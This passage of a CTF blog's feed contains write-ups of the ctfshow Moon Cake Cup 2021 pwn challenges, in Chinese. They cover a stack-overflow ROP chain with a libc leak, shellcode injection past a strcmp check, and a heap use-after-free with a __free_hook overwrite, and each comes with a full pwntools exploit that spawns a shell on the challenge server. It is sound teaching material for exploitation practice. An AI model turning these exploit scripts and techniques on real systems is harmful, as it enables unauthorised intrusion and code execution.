class="comment">#p.sendline(0x38*'1'+p32(e.sym['malloc'])+p32(0x0809e4c5)+p32(0x100000)+p32(0)+p32(0)+p32(ebx_edx_ret)+p32(1)+p32(addr)+p32(ecx_write_edxaddr)+p32(e.sym['write'])+p32(e.sym['main'])+p32(1)+p32(addr)+p32(4))</span></span><br><span class="line"><span class="comment">#shelladdr=u32(p.recv(4))-8</span></span><br><span class="line"><span class="comment">#log.info(hex(shelladdr))</span></span><br><span class="line">shelladdr=<span class="number">0x080ea000</span></span><br><span class="line">ppp=<span class="number">0x0804f460</span></span><br><span class="line">p.sendline(<span class="number">0x38</span>*<span class="string">'1'</span>+p32(e.sym[<span class="string">'mprotect'</span>])+p32(<span class="number">0x0809e4c5</span>)+p32(shelladdr)+p32(<span class="number">0x200</span>)+p32(<span class="number">7</span>)+p32(e.sym[<span class="string">'gets'</span>])+p32(ret)+p32(shelladdr))</span><br><span class="line">debug()</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line"><span class="comment">#p.sendline(asm(shellcraft.sh()))</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;当时在xman听大佬将leve5利用时，很疑惑要调用mprotect，明明可以溢出执行&lt;code&gt;system(&amp;#39;/bin/sh&amp;#39;)&lt;/code&gt;了. 直到我遇到些奇怪的静态编译题,我真香了故小记一下</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-月饼杯2021-pwn-wp</title>
    <link href="lexsd6.github.io/2021/09/21/ctfshow-%E6%9C%88%E9%A5%BC%E6%9D%AF-pwn-wp/"/>
    <id>lexsd6.github.io/2021/09/21/ctfshow-%E6%9C%88%E9%A5%BC%E6%9D%AF-pwn-wp/</id>
    <published>2021-09-21T06:17:42.396Z</published>
    <updated>2021-09-21T07:10:02.858Z</updated>
    
    <content type="html"><![CDATA[<p>久违参加了ctfshow的比赛，题都比较简单，就是远程环境libc我泄露半天才泄露出来… (⊙﹏⊙) <a id="more"></a></p><h2 id="简单的胖"><a href="#简单的胖" class="headerlink" title="简单的胖"></a>简单的胖</h2><p>题目简单就一个简单amd64位的栈溢出.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">28</span>]; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's your name? "</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  v6 = v3;</span><br><span class="line">  buf[v3 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome to the CTFshow Moon cake cup! %s!\n"</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看下保护只开了NX.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>先一波正常栈溢出,通过<code>printf</code>函数泄露出libc的真实地址和libc版本.</p><p>(但这里远程环境libc 版本,我之前泄露libc死活泄露不出来,看了第二题的libc才猜测两题环境可能一样,tcl)</p><p>然后再通过一波栈溢出getshell.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/09/20 15:40:41</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./moonpwn01'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'pwn.challenge.ctf.show'</span>,<span class="number">28075</span>]</span><br><span class="line"><span class="comment">#GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.</span></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x00000000004006fc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006fe : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400700 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400702 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006fb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006ff : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400578 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400703 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400701 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006fd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004004ce : ret </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">rdi_ret=<span class="number">0x0000000000400703</span></span><br><span class="line">ret=<span class="number">0x00000000004004ce</span> </span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">0x28</span>+p64(ret)+p64(rdi_ret)+p64(e.got[<span class="string">'printf'</span>])+p64(e.sym[<span class="string">'printf'</span>])+p64(e.sym[<span class="string">'_start'</span>]))</span><br><span class="line"></span><br><span class="line">addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(hex(addr))</span><br><span class="line"></span><br><span class="line">x=finder(<span class="string">'printf'</span>,addr) <span class="comment">#Ubuntu GLIBC 2.27-3ubuntu1</span></span><br><span class="line"><span class="comment">#p.sendline('1'*0x28+p64(rdi_ret)+p64(0x601100)+p64(x.dump('gets'))+p64(rdi_ret)+p64(0x601100)+p64(x.dump('puts'))+p64(rdi_ret)+p64(0x601100)+p64(ret)+p64(x.dump('system'))+p64(e.sym['_start']))</span></span><br><span class="line"><span class="comment">#p.sendline('/bin/sh\x00')</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">0x28</span>+p64(rdi_ret)+p64(x.dump(<span class="string">'str_bin_sh'</span>))+p64(ret)+p64(x.dump(<span class="string">'system'</span>))+p64(e.sym[<span class="string">'_start'</span>]))</span><br><span class="line">debug()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="容易的胖"><a href="#容易的胖" class="headerlink" title="容易的胖"></a>容易的胖</h2><p>题目是i386(32位)题目,先看来下了保护发现不仅什么没开.还有读写执行权限(喜).</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>审计下题目代码,发现通过fgets函数用我们可以写入至多256个字节长度的shellcode.</p><p>同时,<code>read(0, &amp;s, 0x14u);</code>触有栈溢出但只能让我们溢出到<code>edp</code>.</p><p>加上,有<code>strcmp(&amp;s, &quot;yes\n&quot;)</code>判断需要我们bypass.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> *v3; <span class="comment">// [esp+10h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;a1;</span><br><span class="line">  sub_80485A6();</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(::s, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your shellcode"</span>);</span><br><span class="line">  fgets(::s, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you know how to use shellcode????"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;s, <span class="string">"yes\n"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you may be need learn it"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"ok,good"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过<code>yes\n\x00</code>+code的方法来绕过strcmp函数。同时，由于题目没有开NX与PIE，因此我们可以通过ida静态分析出通过fgets函数写入的shellcode存放到<code>0x804a040</code>。</p><p>因此我们可以通过栈溢出控制<code>edp</code>，再通过栈特性间接控制<code>eip</code>，在让让<code>eip</code>指向我们shellcode的地址，从而getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/09/20 16:41:27</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./moonpwn02'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=<span class="string">'i386'</span></span><br><span class="line">ip_port=[<span class="string">'pwn.challenge.ctf.show'</span>,<span class="number">28157</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(p32((<span class="number">0x804a040</span>+<span class="number">4</span>))+asm(shellcraft.sh()))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#print(hex(len(pay)))</span></span><br><span class="line">p.sendline(<span class="string">'yes\n\x00'</span>+<span class="string">'\x00'</span>*<span class="number">3</span>+<span class="string">'\x00'</span>*<span class="number">0x8</span>+p32(<span class="number">0x804a040</span>+<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Moon-note"><a href="#Moon-note" class="headerlink" title="Moon_note"></a>Moon_note</h2><p>题目所有保护全开，是个堆题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>题目主要分为creat_notetitle,creat_content,show_content,delet_content_title.</p><p>题目主要问题出现在free chunk功能函数处：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Title of note to delete: "</span>);</span><br><span class="line">  getnline(&amp;v2, <span class="number">16L</span>L);</span><br><span class="line">  ptr = find_note(&amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)(*((_QWORD *)ptr + <span class="number">2</span>) + <span class="number">24L</span>L) = *((_QWORD *)ptr + <span class="number">3</span>);</span><br><span class="line">    *(_QWORD *)(*((_QWORD *)ptr + <span class="number">3</span>) + <span class="number">16L</span>L) = *((_QWORD *)ptr + <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)ptr + <span class="number">4</span>)); <span class="comment">//没有清空内容</span></span><br><span class="line">    <span class="built_in">free</span>(ptr);<span class="comment">//没有note titile chunk清空内容</span></span><br><span class="line">    --<span class="built_in">size</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于在free时没有清空残余内容，导致uaf存在。</p><p>通过notetitle chunk free后，再add 仍指向content chunk .从而通show函数泄露出content chunk addr。</p><p>同时，经过测试libc版本低于2.29。因此还可以利用这free chunk 功能函数制造content chunk  double free。</p><p>从而让content chunk 错位改造出大于0x420的chunk 头，free掉构造出unsorted bin，从而泄露出libc。</p><p>然后通过<code>__free_hook</code>getshell。</p><p>（ps：这里偏移很奇怪，我原来本地libc2.27泄露出来unsorted bin addr 到<code>main_arena</code>为88 字节，然而远程环境为96）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/09/21 01:25:02</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./Moon_note.note'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'pwn.challenge.ctf.show'</span>,<span class="number">28079</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(title)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Title:'</span>)</span><br><span class="line">    p.sendline(str(title))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(title,size,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Title of note to write content:'</span>)</span><br><span class="line">    p.sendline(str(title))</span><br><span class="line">    p.recvuntil(<span class="string">'Size of content'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(title)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Title of note to show content:'</span>)</span><br><span class="line">    p.sendline(str(title))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(title)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Choice: Title of note to delete:'</span>)</span><br><span class="line">    p.sendline(str(title))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>):</span><br><span class="line">    add_note(str(i))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x48</span>,<span class="string">'11111'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x48</span>,<span class="string">'11111'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#free(2)</span></span><br><span class="line">add_note(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add_note(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">addr=u64(p.recvline()[<span class="number">1</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x48</span>,p64(addr<span class="number">-0x20</span>)+p64(addr<span class="number">-0x20</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x48</span>,<span class="string">'11111'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x48</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x461</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">    add(i+<span class="number">6</span>,<span class="number">0x48</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add_note(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">molloc_hook_addr=u64(p.recvline()[<span class="number">1</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span><span class="number">-0x10</span></span><br><span class="line">log.info(hex(molloc_hook_addr))</span><br><span class="line">x=finder(<span class="string">'__malloc_hook'</span>,molloc_hook_addr)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">add_note(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">21</span>,<span class="number">0x48</span>,p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">22</span>,<span class="number">0x48</span>,p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">23</span>,<span class="number">0x48</span>,p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;久违参加了ctfshow的比赛，题都比较简单，就是远程环境libc我泄露半天才泄露出来… (⊙﹏⊙)</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>\`could not patch the PLT stub; unexpected PLT format or the file has been modified after linking!\`报错缓解方法</title>
    <link href="lexsd6.github.io/2021/09/16/&#39;could%20not%20patch%20the%20PLT%20stub;%20unexpected%20PLT%20format%20or%20the%20file%20has%20been%20modified%20after%20linking!&#39;%E6%8A%A5%E9%94%99%E7%BC%93%E8%A7%A3%E6%96%B9%E6%B3%95/"/>
    <id>lexsd6.github.io/2021/09/16/&#39;could%20not%20patch%20the%20PLT%20stub;%20unexpected%20PLT%20format%20or%20the%20file%20has%20been%20modified%20after%20linking!&#39;%E6%8A%A5%E9%94%99%E7%BC%93%E8%A7%A3%E6%96%B9%E6%B3%95/</id>
    <published>2021-09-16T03:39:36.860Z</published>
    <updated>2021-09-16T05:43:36.860Z</updated>
    
